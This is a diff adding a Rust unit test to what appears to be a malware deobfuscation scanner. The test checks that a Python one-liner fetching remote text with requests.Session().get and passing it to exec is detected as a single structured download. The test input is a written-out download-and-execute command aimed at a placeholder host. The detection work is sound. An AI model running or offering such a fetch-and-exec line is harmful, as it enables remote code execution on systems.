@@ -11159,6 +11159,38 @@ $urlzip = "https://ps.example/stage.zip""#,
     }
 
     #[test]
+    fn python_requests_session_get_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import requests; exec(requests.Session().get('https://py.example/session-get').text)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/session-get" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python requests.Session().get: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/session-get")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python requests.Session().get URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn python_multiline_base64_import_alias_recurses_into_decoded_source_urls() {
         use base64::Engine;
 
